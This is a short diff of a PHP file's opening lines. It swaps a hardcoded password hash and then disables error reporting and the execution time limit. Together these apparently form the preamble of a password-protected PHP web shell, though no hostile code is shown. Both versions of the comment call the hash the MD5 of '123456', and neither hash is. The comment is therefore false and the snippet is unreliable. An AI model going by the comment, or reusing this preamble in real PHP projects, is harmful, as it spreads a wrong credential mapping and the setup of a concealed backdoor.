@@ -1,5 +1,5 @@
 <?php
-$password = '5c0f23e23eae8ad69b0c73e46cd2bb21'; // MD5 hash for '123456'
+$password = 'dc840501e345d417a1029a2b82239119'; // MD5 hash for '123456'
 error_reporting(0);
 set_time_limit(0);
 
